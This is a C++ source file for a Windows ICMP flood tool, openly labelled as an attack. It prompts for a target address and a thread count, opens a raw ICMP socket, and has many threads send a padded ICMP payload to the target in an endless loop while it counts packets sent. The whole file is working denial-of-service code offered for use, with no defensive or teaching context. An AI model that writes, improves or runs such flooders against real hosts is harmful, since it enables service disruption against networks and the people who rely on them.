#include<windows.h>
#include<bits/stdc++.h>
#pragma comment(lib, "ws2_32.lib")
using namespace std;
char szMessage[1024]=
    "\x08\x12\xec\xb9\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c"
    "\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x61\x62\x63\x64\x65"
	"\x66\x67\x68\x69\x61\x62\x00";
SOCKET sClient;
SOCKADDR_IN server;
int PORT,MSGSIZE=1024;
string SERVER_ADDRESS;
char c[128];
int ret;
WSADATA wsaData;
bool exitflag=true;
int exit_cnt=0;
bool lck=false;
unsigned long long attack_cnt=0;
void* s(void* id)
{
	int tid=*(int*)(id);
	int e;
	while (exitflag)
	{
		send(sClient, szMessage, strlen(szMessage), 0);
		e=GetLastError();
		if(e==0)
			attack_cnt++;
		else
			cout<<"\nsend error(id "<<e<<") occured in thread "<<tid;
	}
	while(lck==true);
	lck=true;
	exit_cnt++;
	lck=false;
	pthread_exit(0);
}
int main()
{
	WSAStartup(0x0202, &wsaData);
tag1:
	cout<<"attack tcp://";
	scanf("%s",c);
	string t=c;
	memset(c,0,strlen(c));
	for(int i=0; i<t.length(); i++)
	{
		if(t[i]!=':')
			SERVER_ADDRESS.push_back(t[i]);
		else
		{
			for(int j=i+1; j<t.length(); j++)
				c[j-i-1]=t[j];
			break;
		}
	}
	if(inet_addr(SERVER_ADDRESS.c_str()) == INADDR_NONE)
	{
		cout<<"host:"<<SERVER_ADDRESS<<",converting to IP address with DNS...\n";
		struct hostent *h = gethostbyname(SERVER_ADDRESS.c_str());
		if(h==NULL)
		{
			cout<<"Address not found!\n";
			goto tag1;
		}
		SERVER_ADDRESS=inet_ntoa(*(struct in_addr*)h->h_addr_list[0]);
		cout<<"converted to "<<SERVER_ADDRESS<<endl;
	}
	PORT=atoi(c);
	int thread_cnt;
tag2:
	cout<<"number of threads:";
	cin>>thread_cnt;
	if(thread_cnt>64)
	{
		cout<<"warning:thread number is large and may cause lag!\nAre you sure?(Y/N)";
		char c;
		cin>>c;
		if(c=='N')
			goto tag2;
	}
	sClient = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	memset(&server, 0, sizeof(SOCKADDR_IN));
	server.sin_family = PF_INET;
	server.sin_port = htons(PORT);
	server.sin_addr.s_addr = inet_addr(SERVER_ADDRESS.c_str());
	connect(sClient, (struct sockaddr *) &server, sizeof(SOCKADDR_IN));
	cout<<"connected "<<SERVER_ADDRESS<<":"<<PORT<<endl;
	cout<<"creating threads...";
	for(int i=1; i<=thread_cnt; i++)
		pthread_create(0,0,s,&i);
	cout<<"done\nattacking "<<SERVER_ADDRESS<<":"<<PORT<<" with "<<thread_cnt<<" threads...[press ESC to stop]";
	while(!GetAsyncKeyState(VK_ESCAPE))
	{
		if(attack_cnt%1024==0)
			cout<<endl<<attack_cnt<<" packets sent";
	}
	cout<<"\nstopped.\nclosing threads...";
	exitflag=false;
	while(exit_cnt!=thread_cnt);
	cout<<"done\nclosing socket...";
	closesocket(sClient);
	cout<<"done\ncleaning up WSA...";
	WSACleanup();
	cout<<"done.";
	return 0;
}
